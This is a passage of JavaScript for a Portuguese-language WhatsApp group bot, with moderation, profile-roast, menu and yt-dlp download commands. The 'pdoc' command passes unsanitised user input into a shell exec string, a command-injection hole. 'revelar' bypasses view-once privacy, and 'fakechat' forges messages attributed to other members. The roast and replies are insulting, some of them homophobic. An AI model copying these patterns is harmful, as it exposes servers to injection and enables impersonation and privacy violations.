        const botNumeroLimpo = botNumber.replace(/\D/g, '');

        if (alvoNumero === executorNumero) return reply("❌ Você não pode se remover doente.");
        if (alvoNumero === botNumeroLimpo || alvoId === botNumber) {
            await conn.sendMessage(from, { text: `⚠️ @${executorNumero} tentou remover o bot, muito but KKKKK`, mentions: [sender] });
            return;
        }
        if (alvoDono) {
            await conn.sendMessage(from, { text: `☠️ @${executorNumero} tentou remover o dono, muito but KKKKKK`, mentions: [sender] });
            return;
        }
        if (alvoAdmin) return reply("❌ Não posso remover administradores caralho.");

        await reagir(from, "🚫");
        await conn.groupParticipantsUpdate(from, [alvoId], "remove");
        await conn.sendMessage(from, { text: `🚫 @${alvoNumero} removido do grupo otário.`, mentions: [alvoId] }, { quoted: selo });
        await reagir(from, "✅");

    } catch (erro) {
        console.log(erro);
        await reagir(from, "❌");
        reply("❌ Erro ao remover a porra do usuário.");
    }
}
break;

case 'mute': {
    try {
        if (!isGroup) return reply(msg.SoEmGrupo);

        const executorJid = info.key.participantAlt || info.key.participant || info.key.remoteJid || sender;
        const executorJidNormalizado = jidNormalizedUser(executorJid);

        const verificar = await sistemaVerificacao(conn, from, executorJidNormalizado, { numerodono: NumberDono }, botNumber);

        if (!verificar.isSenderAdmin && !verificar.isDonoBot) return reply(msg.SoAdmin);
        if (!verificar.isBotAdmin) return reply(msg.BotAdmin);

        let alvo = null;
        const contextInfo = info?.message?.extendedTextMessage?.contextInfo || {};

        if (contextInfo.mentionedJid?.length > 0) {
            alvo = contextInfo.mentionedJid[0];
        } else if (contextInfo.participant) {
            alvo = contextInfo.participant;
        } else if (info?.quoted?.sender) {
            alvo = info.quoted.sender;
        } else if (q) {
            const numero = q.replace(/\D/g, '');
            if (numero.length >= 5) alvo = numero;
        }

        if (!alvo) return reply(`*🎯 mencione quem quer que fique caladinho*`);

        const membro = verificar.buscarMembro(alvo);
        if (!membro) return reply("❌ Usuário não foi encontrado.");

        const alvoId = verificar.getId(membro);
        const alvoNumero = verificar.getNumero(membro);
        const alvoAdmin = verificar.isAdmin(membro);
        const alvoDono = verificar.isDono(membro);
        const executorNumero = verificar.getNumero({ id: executorJidNormalizado });
        const botNumeroLimpo = botNumber.replace(/\D/g, '');

        if (alvoNumero === executorNumero) return reply("❌ Você não pode se punir doente.");
        if (alvoNumero === botNumeroLimpo || alvoId === botNumber) return reply(`*Não posso mudar o bot né inteligência😵*`);
        if (alvoDono) return reply(`*não ouse encostar esses dedos imundos no meu dono💢*`);
        if (alvoAdmin) return reply(`*não pode mudar um administrador burrão*`);

        const dirMute = `./DATABASE2/GRUPOS/MUTE/${from}.json`;
        if (!fs.existsSync('./DATABASE2/GRUPOS/MUTE')) {
            fs.mkdirSync('./DATABASE2/GRUPOS/MUTE', { recursive: true });
        }
        if (!fs.existsSync(dirMute)) {
            fs.writeFileSync(dirMute, JSON.stringify([{ silenciados: [], mutados: [] }], null, 2));
        }

        const dataMute = JSON.parse(fs.readFileSync(dirMute));
        const grupoMute = dataMute[0];

        const tipo = args[0]?.toLowerCase() === 'silenciar' ? 'silenciar' : 'mutar';

        if (tipo === 'silenciar') {
            if (grupoMute.silenciados.includes(alvoId)) {
                return mention(`*ᴏ @${alvoNumero} já está silenciado*`);
            }
            grupoMute.silenciados.push(alvoId);
            fs.writeFileSync(dirMute, JSON.stringify(dataMute, null, 2));
            await mention(`*ᴏ @${alvoNumero} foi silenciado @${executorNumero} 🔇*`);
        } else {
            if (grupoMute.mutados.includes(alvoId)) {
                return mention(`*ᴏ @${alvoNumero} já está mutado*`);
            }
            grupoMute.mutados.push(alvoId);
            fs.writeFileSync(dirMute, JSON.stringify(dataMute, null, 2));
            await mention(`*ᴏ @${alvoNumero} foi mutado por @${executorNumero} 🚫*`);
        }

        await reagir(from, "✅");
    } catch (erro) {
        console.log(erro);
        await reagir(from, "❌");
        reply("❌ Erro ao mutar usuário.");
    }
}
break;

case 'desmute': {
    try {
        if (!isGroup) return reply(msg.SoEmGrupo);

        const executorJid = info.key.participantAlt || info.key.participant || info.key.remoteJid || sender;
        const executorJidNormalizado = jidNormalizedUser(executorJid);

        const verificar = await sistemaVerificacao(conn, from, executorJidNormalizado, { numerodono: NumberDono }, botNumber);

        if (!verificar.isSenderAdmin && !verificar.isDonoBot) return reply(msg.SoAdmin);
        if (!verificar.isBotAdmin) return reply(msg.BotAdmin);

        let alvo = null;
        const contextInfo = info?.message?.extendedTextMessage?.contextInfo || {};

        if (contextInfo.mentionedJid?.length > 0) {
            alvo = contextInfo.mentionedJid[0];
        } else if (contextInfo.participant) {
            alvo = contextInfo.participant;
        } else if (info?.quoted?.sender) {
            alvo = info.quoted.sender;
        } else if (q) {
            const numero = q.replace(/\D/g, '');
            if (numero.length >= 5) alvo = numero;
        }

        if (!alvo) return reply(`*🎯 mencione quem quer que volte a falar*`);

        const membro = verificar.buscarMembro(alvo);
        if (!membro) return reply("❌ Usuário não encontrado.");

        const alvoId = verificar.getId(membro);
        const alvoNumero = verificar.getNumero(membro);

        const dirMute = `./DATABASE2/GRUPOS/MUTE/${from}.json`;
        if (!fs.existsSync(dirMute)) return mention(`*ᴏ @${alvoNumero} ɴᴀᴏ ᴇsᴛᴀ ᴘᴜɴɪᴅᴏ*`);

        const dataMute = JSON.parse(fs.readFileSync(dirMute));
        const grupoMute = dataMute[0];

        const estaSilenciado = grupoMute.silenciados.includes(alvoId);
        const estaMutado = grupoMute.mutados.includes(alvoId);

        if (!estaSilenciado && !estaMutado) {
            return mention(`*ᴏ @${alvoNumero} não está punido*`);
        }

        grupoMute.silenciados = grupoMute.silenciados.filter(id => id !== alvoId);
        grupoMute.mutados = grupoMute.mutados.filter(id => id !== alvoId);
        fs.writeFileSync(dirMute, JSON.stringify(dataMute, null, 2));
        await mention(`*ᴏ @${alvoNumero} foi despunido por @${verificar.getNumero({ id: executorJidNormalizado })} 🙌*`);

        await reagir(from, "✅");
    } catch (erro) {
        console.log(erro);
        await reagir(from, "❌");
        reply("❌ Erro ao desmutar usuário.");
    }
}
break;

case 'perfil': {
    try {
        await reagir(from, "👤");

        let target = sender; 
        const ctx = info?.message?.extendedTextMessage?.contextInfo;

        if (ctx?.mentionedJid?.[0]) {
            target = ctx.mentionedJid[0]; 
        } else if (ctx?.participant) {
            target = ctx.participant; 
        } else if (q) {
            const num = q.replace(/\D/g, ''); 
            if (num.length >= 10) target = `${num}@s.whatsapp.net`;
        }

        target = jidNormalizedUser(target); 

        // 🔥 nome do usuário
        let nomeAlvo = pushname;
        if (target !== sender) {
            try {
                const contato = Infos_Do_Grupo?.participants?.find(p => p.id === target);
                nomeAlvo = contato?.notify || contato?.name || `@${target.split("@")[0]}`;
            } catch {
                nomeAlvo = `@${target.split("@")[0]}`;
            }
        }

        // 🔥 foto de perfil
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(target, 'image');
        } catch {
            ppUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZRDMdrGEhwwcBVJsSwdjVZycl9lPdJsdReOsm3Sq1Xg&s=10'; 
        }

        // 🔥 bio
        let status;
        try {
            const bio = await conn.fetchStatus(target);
            status = bio?.status || "*sem bio*";
        } catch {
            status = "*bio oculta ou indisponível (desgraçado)*";
        }

        // 🔥 porcentagens
        const pct = () => `${Math.floor(Math.random() * 101)}%`;
        const gay      = pct();
        const feio     = pct();
        const lindo    = pct();
        const gostoso  = pct();
        const chato    = pct();
        const corno    = pct();
        const burro    = pct();
        const invejoso = pct();
        const sortudo  = pct();
        const estiloso = pct();

        // 🔥 número
        const numUser = target.split("@")[0];

        // 🔥 buffer da foto
        const imgBuff = await getBuffer(ppUrl);

        // 🔥 texto
        let perfilMsg = `╔═━━━═══━━━═══━━━═══━━━═══━━━╗
║        🔥 𝐏𝐄𝐑𝐅𝐈𝐋 𝐙𝐘𝐑𝐎𝐍 🔥
╠═━━━═══━━━═══━━━═══━━━═══━━━╣
║ 👤 Nome: ${nomeAlvo}
║ 📱 Número: ${numUser}
║ 📝 Bio: ${status}
║
║ 🕒 Visto por: Kyara Scanner
╠═━━━═══━━━═══━━━═══━━━═══━━━╣
║      🧠 𝐀𝐍𝐀́𝐋𝐈𝐒𝐄 𝐃𝐄 𝐏𝐄𝐑𝐅𝐈𝐋
╠═━━━═══━━━═══━━━═══━━━═══━━━╣
║ 🏳️‍🌈 Gay: ${gay}
║ 🤢 Feio(a): ${feio}
║ 😍 Lindo(a): ${lindo}
║ 🔥 Gostoso(a): ${gostoso}
║ 🙄 Chato(a): ${chato}
║ 🐂 Corno(a): ${corno}
║ 🐴 Burro(a): ${burro}
║ 😒 Invejoso(a): ${invejoso}
║ 🍀 Sortudo(a): ${sortudo}
║ 😎 Estiloso(a): ${estiloso}
╠═━━━═══━━━═══━━━═══━━━═══━━━╣
║ 📊 𝐑𝐄𝐒𝐔𝐌𝐎 𝐃𝐎 𝐒𝐈𝐒𝐓𝐄𝐌𝐀
║
║ ⚡ Nível de Respeito: ${Math.floor(Math.random()*100)}%
║ 💎 Nível de Raridade: ${Math.floor(Math.random()*100)}%
║ 🚀 Potencial: ${Math.floor(Math.random()*100)}%
║
╠═━━━═══━━━═══━━━═══━━━═══━━━╣
║ 🤖 Kyara & Kyara-Ai
║ ❤️‍🔥 Kyara
╚═━━━═══━━━═══━━━═══━━━═══━━━╝

🔥❤️‍🔥 ⟡ 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 ⟡ ❤️‍🔥🔥`;

        // 🔥 envio
        await conn.sendMessage(from, { image: imgBuff, caption: perfilMsg, mentions: [target] }, { quoted: selo });
        await reagir(from, "✅");

    } catch (e) {
        console.error("Erro no perfil:", e);
        await reagir(from, "❌");
        reply("❌ Erro ao carregar perfil.");
    }
}
break;

case 'antilink': {
  try {
    if (!isGroup) return reply(msg.SoEmGrupo);

    const executorJid = info.key.participantAlt || info.key.participant || info.key.remoteJid || sender;
    const executorJidNormalizado = jidNormalizedUser(executorJid);

    const verificar = await sistemaVerificacao(conn, from, executorJidNormalizado, { numerodono: NumberDono }, botNumber);

    if (!verificar.isSenderAdmin && !verificar.isDonoBot) return reply(msg.SoAdmin);
    if (!verificar.isBotAdmin) return reply(msg.BotAdmin);

    const opcao = (q || text || args?.join(' ') || '').trim();

    if (!opcao) return reply('1 pra ligar / 0 pra desligar');

    const isAntiLinkAtual = dataGp[0].antilinkhard || false;

    if (Number(opcao) === 1) {
      if (isAntiLinkAtual) return reply('O recurso de antilink já está ativado desgraça.');

      dataGp[0].antilinkhard = true;
      setGp(dataGp);

      return reply(MSG.Ativado);

    } else if (Number(opcao) === 0) {
      if (!isAntiLinkAtual) return reply('O recurso de antilink já está desativado porra.');

      dataGp[0].antilinkhard = false;
      setGp(dataGp);

      return reply(MSG.Desativado);

    } else {
      return reply('1 para ativar, 0 para desativar');
    }

  } catch (erro) {
    console.log(erro);
    reply("Erro ao executar comando.");
  }
}
break;

case 'rvisu':
case 'revelar': {
  await reagir(from, "👀")

  try {
    const quoted = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage

    // ================== VIDEO ==================
    let video = quoted?.videoMessage || 
                quoted?.viewOnceMessageV2?.message?.videoMessage || 
                quoted?.viewOnceMessage?.message?.videoMessage

    if (video) {
      let buff = await getFileBuffer(video, 'video')

      return await conn.sendMessage(from, {
        video: buff,
        mimetype: 'video/mp4',
        
      }, { quoted: selo })
    }

    // ================== IMAGEM ==================
    let image = quoted?.imageMessage || 
                quoted?.viewOnceMessageV2?.message?.imageMessage || 
                quoted?.viewOnceMessage?.message?.imageMessage

    if (image) {
      let buff = await getFileBuffer(image, 'image')

      return await conn.sendMessage(from, {
        image: buff,
        
      }, { quoted: selo })
    }

    // ================== AUDIO ==================
    let audio = quoted?.audioMessage || 
                quoted?.viewOnceMessageV2Extension?.message?.audioMessage

    if (audio) {
      let buff = await getFileBuffer(audio, 'audio')

      return await conn.sendMessage(from, {
        audio: buff,
        mimetype: 'audio/mpeg',
        ptt: false,
        
      }, { quoted: selo })
    }

    reply("• Marque uma imagem, vídeo ou áudio de visualização única (seu X9 do caramba)")

  } catch (err) {
    console.log('❌ Erro no revelar:', err)
    reply("Erro ao revelar mídia.")
  }

  break;
}

case 'fakechat': {
  try {
    if (!q || !q.includes('|')) {
      return reply(`*Formato incorreto!*\n\n📌 Exemplo:\n${prefix + command} mensagem fake|resposta\n\n💡 *Responda a mensagem de alguém para usar!*`);
    }

    const partes = q.split("|");
    const textoFake = partes[0]?.trim();
    const bott = partes[1]?.trim();

    if (!textoFake || !bott) {
      return reply(`*Preencha tudo corretamente!*\n\n📌 Exemplo:\n${prefix + command} mensagem fake|resposta`);
    }

    const prefixosBloqueados = [prefix, "-", "/", "#", "+", ".", "!"];
    if (prefixosBloqueados.some(p => bott.startsWith(p))) {
      return reply('*Não é permitido fazer o bot enviar comandos no fake chat, seu desgraçado.*');
    }

    const ctxInfo = info?.message?.extendedTextMessage?.contextInfo;

    if (!ctxInfo?.participant || ctxInfo?.stanzaId === info?.key?.id) {
      return reply(`*Responda a mensagem de alguém para usar esse comando!*`);
    }

    const mentioned = jidNormalizedUser(normalizar(ctxInfo.participant));
    const msgId = "BAE5" + require('crypto').randomBytes(13).toString('hex').toUpperCase();

    await reagir(from, "🎭");

    await conn.sendMessage(from, {
      text: bott
    }, {
      quoted: {
        key: {
          fromMe: false,
          remoteJid: from,
          participant: mentioned,
          id: msgId
        },
        message: {
          conversation: textoFake
        }
      }
    });

    await reagir(from, "✅");

  } catch (e) {
    console.error(e);
    await reagir(from, "❌");
    reply('*Erro ao criar fake chat.*');
  }
}
break;

case 'gerarlink': {
try {

await reagir(from, "⏳");

const axios = require("axios");
const FormData = require("form-data");

async function uploadCatbox(buffer, filename) {
    const form = new FormData();

    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, filename);

    const { data } = await axios.post(
        "https://catbox.moe/user/api.php",
        form,
        {
            headers: form.getHeaders(),
            maxBodyLength: Infinity,
            maxContentLength: Infinity
        }
    );

    if (typeof data !== "string" || !data.startsWith("https://")) {
        throw new Error(data || "Falha ao enviar para o Catbox.");
    }

    return data.trim();
}

const quotedMsg = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage;

if (!quotedMsg) {
    await reagir(from, "❌");
    return reply("❌ Responda uma imagem, vídeo, áudio ou documento.");
}

const media =
    quotedMsg.imageMessage ||
    quotedMsg.videoMessage ||
    quotedMsg.audioMessage ||
    quotedMsg.documentMessage ||
    quotedMsg?.viewOnceMessage?.message?.imageMessage ||
    quotedMsg?.viewOnceMessage?.message?.videoMessage ||
    quotedMsg?.viewOnceMessageV2?.message?.imageMessage ||
    quotedMsg?.viewOnceMessageV2?.message?.videoMessage;

if (!media) {
    await reagir(from, "❌");
    return reply("❌ Responda uma imagem, vídeo, áudio ou documento.");
}

let tipo = "document";
let nome = "arquivo.bin";

if (quotedMsg.imageMessage || quotedMsg?.viewOnceMessage?.message?.imageMessage || quotedMsg?.viewOnceMessageV2?.message?.imageMessage) {
    tipo = "image";
    nome = "imagem.jpg";
}

if (quotedMsg.videoMessage || quotedMsg?.viewOnceMessage?.message?.videoMessage || quotedMsg?.viewOnceMessageV2?.message?.videoMessage) {
    tipo = "video";
    nome = "video.mp4";
}

if (quotedMsg.audioMessage) {
    tipo = "audio";
    nome = "audio.mp3";
}

if (quotedMsg.documentMessage) {
    tipo = "document";
    nome = quotedMsg.documentMessage.fileName || "arquivo";
}

const buffer = await getFileBuffer(media, tipo);

const link = await uploadCatbox(buffer, nome);

await conn.sendMessage(
    from,
    {
        text: `✅ *LINK GERADO*

📎 Arquivo: ${nome}

🛅 Serviço: CatBox.moe

🌐 ${link}`
    },
    {
        quoted: selo
    }
);

await reagir(from, "✅");

} catch (e) {
    console.error("[GERARLINK ERROR]", e?.response?.data || e);
    await reagir(from, "❌");
    reply(`❌ Erro ao gerar link.\n\n${e.message || e}`);
}
}
break;

case 'bemvindo':
case 'welcome': {
  if (!isGroup) return reply(msg.SoEmGrupo);
  if (!So_Admins && !So_Dono) return reply(msg.SoAdmin);

  const metadata = await conn.groupMetadata(from)
  const botId = conn.user.id.split(":")[0] + "@s.whatsapp.net"

  const isBotAdmin = metadata.participants.some(
    p => p.id === botId && p.admin
  )

  if (!isBotAdmin) return reply(msg.BotAdmin);

  if (!args[0]) return reply('1 pra ligar / 0 pra desligar');

  const status = Number(args[0]);

  if (status === 1) {
    if (isBemvindo) return reply('Já está ativo');

    if (!dataGp[0].wellcome) dataGp[0].wellcome = [{}];
    if (!dataGp[0].wellcome[0]) dataGp[0].wellcome[0] = {};

    dataGp[0].wellcome[0].bemvindo1 = true;
    setGp(dataGp);

    return reply(MSG.Ativado);

  } else if (status === 0) {
    if (!isBemvindo) return reply('Já está desativado');

    if (!dataGp[0].wellcome) dataGp[0].wellcome = [{}];
    if (!dataGp[0].wellcome[0]) dataGp[0].wellcome[0] = {};

    dataGp[0].wellcome[0].bemvindo1 = false;
    setGp(dataGp);

    return reply(MSG.Desativado);
  }

  return reply('1 para ativar, 0 para desativar');
}
break;

case 'legendasaiu': {
  if (!isGroup) return reply(msg.SoEmGrupo);
  if (!isGroupAdmins) return reply(msg.SoAdmin);
  if (args.length < 1) return reply('*Escreva a mensagem de saída*');

  const teks = q || args.join(" ");

  if (isBemvindo) {
    dataGp[0].wellcome[0].legendasaiu = teks;
    setGp(dataGp);
    reply('*Mensagem de saída definida com sucesso!*');
  } else {
    reply(`Ative o ${prefix}bemvindo 1`);
  }
}
break;

case 'linkgp':
if(!isGroupAdmins) return reply(msg.SoAdmins);
if(!isGroup) return reply(msg.SoEmGrupo)
if(!isBotGroupAdmins) return reply(msg.BotAdmin);
linkgc = await conn.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break;

case 'so_adm':
if(!isGroup) return reply(msg.SoEmGrupo)
if(!isGroupAdmins) return reply(msg.SoAdmins)
if(!isBotGroupAdmins) return reply(msg.BotAdmin)
if(args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if(Number(args[0]) === 1) {
if(SoAdmins) return reply('Ja esta ativo')
dataGp[0].So_Admins = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de só adm utilizar comandos neste grupo.')
} else if(Number(args[0]) === 0) {
if(!SoAdmins) return reply('Ja esta Desativado')
dataGp[0].So_Admins = false
setGp(dataGp)
reply('Desativou o recurso de só adm utilizar comandos neste grupo.️')
} else {
reply('1 para ativar, 0 para desativar')
}
break;

//COMANDOS PARA GRUPOS
case 'dono':
case 'bot': {
if (command === 'bot') {
await reagir(from, "🔥");
await reply(`╭━━━━━━━━━━━〔 🤖 BOT 🤖 〕━━━━━━━━━━━━╮
┃
┃ 🤖 ${NomeBot}
┃ 📞 wa.me/${botNumber.split('@')[0]}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`);
} else if (command === 'dono') {
await reagir(from, "👑");
await reply(`╭━━━━━━━━━━━〔 🔥 DONO PRINCIPAL 🔥 〕━━━━━━━━━━━━╮
┃
┃ 👑 ${NickDono}
┃ 📞 wa.me/${NumberDono}
┃ 🌐 Site oficial: https://
┃ 📞 Número comercial: https://wa.me/message/FO4NMGVGHVUCI1
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`);
}
}
break;

case 'play': {
try {
if (!q) return reply(`❌ Digite o nome da música/vídeo

Ex: ${prefix}play mc poze`);

await reagir(from, "🎧");

let search = await ytSearch(q);
let video = search.videos[0];

if (!video) return reply('❌ Nenhum resultado encontrado.');

let sections = [{
title: "Resultados",
rows: search.videos.slice(0, 5).map(v => ({
title: v.title.slice(0, 60),
description: `⏱ ${v.timestamp || "?"} • ${v.author?.name || "Desconhecido"}`,
id: `${prefix}play ${v.url}`
}))
}];

let RG = `╭⪩⪨━━━━━━━━━━━━━━━━━━━━⪩⪨╮
        ⚡ 𝒁𝒀𝑹𝑶𝑵 𝑫𝑳 ⚡
╰⪩⪨━━━━━━━━━━━━━━━━━━━━⪩⪨╯

『 🎵 𝑻í𝒕𝒖𝒍𝒐 』
╰➤ ${video.title}

『 👤 𝑪𝒂𝒏𝒂𝒍 』
╰➤ ${video.author?.name || "Desconhecido"}

『 ⏳ 𝑫𝒖𝒓𝒂çã𝒐 』
╰➤ ${video.timestamp || "?"}

⟢ Selecione uma opção abaixo ⟣`;

await conn.sendMessage(from, {
interactiveMessage: {
title: RG,
footer: "© Kyara • Clique para baixar",
thumbnail: video.thumbnail,
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "© Kyara",
url: "https://wa.me/5519995729970",
copy_code: "© Kyara",
expiration_time: Date.now() + (86400000 * 30)
},
bottom_sheet: {
in_thread_buttons_limit: 3,
divider_indices: [1, 2, 3, 999],
list_title: "Opções de Download",
button_title: "Selecionar"
},
tap_target_configuration: {
title: "Play Downloader",
description: "Sistema de download",
canonical_url: "https://wa.me/5519995729970",
domain: "",
button_index: 0
}
}),
buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "🎵 Baixar Áudio",
id: `${prefix}playdl ${video.videoId}`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "🎬 Baixar Doc",
id: `${prefix}pdoc ${video.videoId}`
})
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "🔎 Vídeos Similares",
sections
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "📢 Canal",
url: "https://whatsapp.com/channel/0029Vb7SjkeIN9iuwkZ3Np3f"
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📋 Copiar link",
copy_code: video.url
})
}
]
}
}
}, { quoted: selo || info });

} catch (e) {
console.log(e);
reply('❌ Erro ao executar comando.');
}
}
break;

case 'playdl': {
try {
    if (!q?.trim()) return reply("❌ Envie o link ou ID do vídeo.");

    await reagir(from, "🎧");

    const pasta = "./temp";
    if (!fs.existsSync(pasta)) fs.mkdirSync(pasta, { recursive: true });

    const entrada = q.trim();
    const url = /^https?:\/\//i.test(entrada)
        ? entrada
        : `https://www.youtube.com/watch?v=${encodeURIComponent(entrada)}`;

    const file = `audio_${Date.now()}.mp3`;
    const output = path.resolve(pasta, file);

    const { execFile } = require("child_process");

    execFile(
        "yt-dlp",
        [
            "--no-playlist",
                                "--extractor-args", "youtube:player_client=mweb",
            "-x",
            "--audio-format", "mp3",
            "-o", output,
            url
        ],
        async (err, stdout, stderr) => {
            try {
                if (err) {
                    console.log("ERRO YT-DLP:", stderr || err);
                    await reagir(from, "❌");
                    return reply("❌ Erro ao baixar áudio.");
                }

                if (!fs.existsSync(output)) {
                    await reagir(from, "❌");
                    return reply("❌ Arquivo de áudio não foi gerado.");
                }

                await conn.sendMessage(from, {
                    audio: fs.readFileSync(output),
                    mimetype: "audio/mpeg",
                    fileName: file
                }, { quoted: selo || info });

                fs.unlinkSync(output);
                await reagir(from, "✅");

            } catch (e) {
                console.log("ERRO AO ENVIAR ÁUDIO:", e);
                try {
                    if (fs.existsSync(output)) fs.unlinkSync(output);
                } catch {}
                await reagir(from, "❌");
                reply("❌ Erro ao enviar áudio.");
            }
        }
    );

} catch (e) {
    console.log("ERRO PLAYDL:", e);
    await reagir(from, "❌");
    reply("❌ Erro no comando playdl.");
}
}
break;

case 'pdoc': {
try {
if (!q) return reply(`🎥 Use:\n${prefix + command} link_do_video`);

if (!q.startsWith('http')) {
return reply('❌ Envie uma URL válida.');
}

await reagir(from, '⏳');

const { exec } = require('child_process');

const pasta = './temp';
if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);

const nome = `video_${Date.now()}.mp4`;
const saida = path.join(pasta, nome);

// 🔥 comando mais estável do yt-dlp
const cmd = `yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/mp4/best" -o "${saida}" "${q}"`;

exec(cmd, async (erro, stdout, stderr) => {
try {

if (erro) {
console.log(stderr || erro);
await reagir(from, '❌');
return reply('❌ Falha ao baixar vídeo. Link pode não ser suportado ou yt-dlp desatualizado.');
}

if (!fs.existsSync(saida)) {
await reagir(from, '❌');
return reply('❌ Arquivo não foi gerado pelo yt-dlp.');
}

await conn.sendMessage(from, {
video: fs.readFileSync(saida),
mimetype: 'video/mp4',
caption: `✅ *Vídeo baixado com sucesso!*`
}, { quoted: selo });

fs.unlinkSync(saida);
await reagir(from, '✅');

} catch (e) {
console.log(e);
reply('❌ Erro ao enviar vídeo.');
}
});

} catch (e) {
console.log(e);
reply('❌ Erro no comando pdoc.');
}
}
break;

case 'menu': {
try {
await reagir(from, "❤️‍🔥");

console.log("[MENU] Iniciando envio...");

const imgMenuBuffer = fs.readFileSync("./dono/menus/Foto-menu/img-menu.jpg");

const mediaMenu = await prepareWAMessageMedia(
  { image: imgMenuBuffer },
  { upload: conn.waUploadToServer }
);

console.log("[MENU] Imagem preparada");

const listaMenus = {
  title: "╭─〔 ⚡ 𝒁𝒀𝑹𝑶𝑵 𝑴𝑬𝑵𝑼 ⚡ 〕─╮",
  sections: [
    {
      title: "📂 CATEGORIAS",
      rows: [
        {
          header: "🌌 PRINCIPAL",
          title: "📜 Menu Principal",
          description: "Comandos essenciais do Kyara",
          id: `${prefix}menuu`
        },
        {
          header: "📥 DOWNLOADS",
          title: "🎧 Menu Download",
          description: "Baixe músicas, vídeos e mídias",
          id: `${prefix}menudown`
        },
        {
          header: "🔎 PESQUISA",
          title: "❤️‍🔥 Menu Pesquisa",
          description: "Google, IA, consultas e buscas",
          id: `${prefix}menupesquisa`
        },
        {
          header: "🎭 STICKERS",
          title: "🖼️ Menu Figurinhas",
          description: "Criar e converter stickers",
          id: `${prefix}menufig`
        },
        {
          header: "🛡️ ADMIN",
          title: "💠 Menu Admin",
          description: "Controle e moderação do grupo",
          id: `${prefix}menuadm`
        },
        {
          header: "👥 MEMBROS",
          title: "👤 Menu Membros",
          description: "Recursos para membros",
          id: `${prefix}menumemb`
        },
        {
          header: "🎮 DIVERSÃO",
          title: "🤣 Menu Brincadeiras",
          description: "Jogos e comandos de diversão",
          id: `${prefix}menubrink`
        },
        {
          header: "⚔️ RPG",
          title: "🧙 Menu RPG",
          description: "Aventuras, duelos e economia",
          id: `${prefix}menurpg`
        },
        {
          header: "🪪 PERFIL",
          title: "👤 Seu Perfil",
          description: "Veja suas informações",
          id: `${prefix}perfil`
        },
        {
          header: "🛒 LOJA",
          title: "🛍️ Catálogo",
          description: "Produtos e serviços",
          id: `${prefix}catalogo`
        }
      ]
    }
  ]
};

const botoes = [
  {
    name: "single_select",
    buttonParamsJson: JSON.stringify(listaMenus)
  }
];

const textok = `
╭━━〔 🤖 𝒁𝒀𝑹𝑶𝑵-𝑴𝑫 〕━━⬣
┃
┃ 👤 ${pushname}
┃ 📅 ${date}
┃ ⏰ ${hora2}
┃
╰━━━━━━━━━━━━━━⬣

📡 Sistema: Online
🚀 Status: Funcionando

📂 Escolha uma categoria abaixo.
`;

const mensagemMenu = {
  interactiveMessage: {
    header: {
      title: "⚡ KYARA",
      hasMediaAttachment: true,
      imageMessage: mediaMenu.imageMessage
    },

    body: {
      text: textok
    },

    footer: {
      text: `© ${NickDono}`
    },

    nativeFlowMessage: {
      buttons: botoes
    }
  }
};

console.log("[MENU] Enviando interactiveMessage...");

await conn.relayMessage(
  from,
  mensagemMenu,
  {
    messageId: `${Date.now()}-menu`
  }
);

console.log("[MENU] Enviado com sucesso!");

} catch (e) {
console.error("[MENU ERROR]", e);
await reply("❌ Erro ao enviar o menu.");
}
break;
}

case 'vip':
case 'menuvip': {
if (!isVip && !So_Dono)
return reply('💎 Apenas usuários VIP podem acessar este menu.');

await conn.sendMessage(from, {
image: FotoMenu,
caption: menus.menuVip(prefix, sender),
mentions: [sender]
}, { quoted: info });

}
break;

case 'menupesquisa':
case 'searchmenu': {

await conn.sendMessage(from, {
    image: FotoMenu,
    caption: menus.menuPesquisa(prefix, sender),
    mentions: [sender]
}, { quoted: info });

}
break;

case 'menuseguranca':
case 'segmenu':
case 'securitymenu': {
try {
await reagir(from, "🛡️");

if (!isGroup) return reply("❌ Esse comando só funciona em grupos!");

const groupMetadata = await conn.groupMetadata(from).catch(() => null);
const participants = groupMetadata ? groupMetadata.participants : [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);

const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
const isAdmins = groupAdmins.includes(sender);
const isBotAdmins = groupAdmins.includes(botNumber);

if (!isGroupAdmins) return reply("❌ Apenas administradores podem abrir este menu!");
console.log("Sender:", sender)
console.log("Admins:", groupAdmins)
console.log("É admin?", isAdmins)

const sock = global.sock || conn;

if (!fs.existsSync("./dono/menus/Foto-menu/menu-seguranca.jpg")) {
return reply("❌ Imagem não encontrada:\n./dono/menus/Foto-menu/menu-seguranca.jpg");
}

const imgSegBuffer = fs.readFileSync("./dono/menus/Foto-menu/menu-seguranca.jpg");

const mediaSeg = await prepareWAMessageMedia(
{ image: imgSegBuffer },
{ upload: conn.waUploadToServer }
);

const criarCard = (titulo, corpo, botoes) => ({
header: {
hasMediaAttachment: true,
imageMessage: mediaSeg.imageMessage
},
headerType: "IMAGE",
body: { text: corpo },
footer: { text: titulo },
nativeFlowMessage: {
buttons: botoes
}
});

const btn = (texto, id) => ({
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: texto,
id
})
});

const carouselMessage = {
cards: [
criarCard(
"🔗 KYARA SECURITY • LINKS",
`╭━━〔 🔗 PROTEÇÃO DE LINKS 〕━━⬣

┃ 🔗 ${prefix}antilink on/off
┃ 🌐 ${prefix}antigroup on/off
┃ 📎 ${prefix}antilinkhard on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("🔗 ANTILINK", `${prefix}antilink on`),
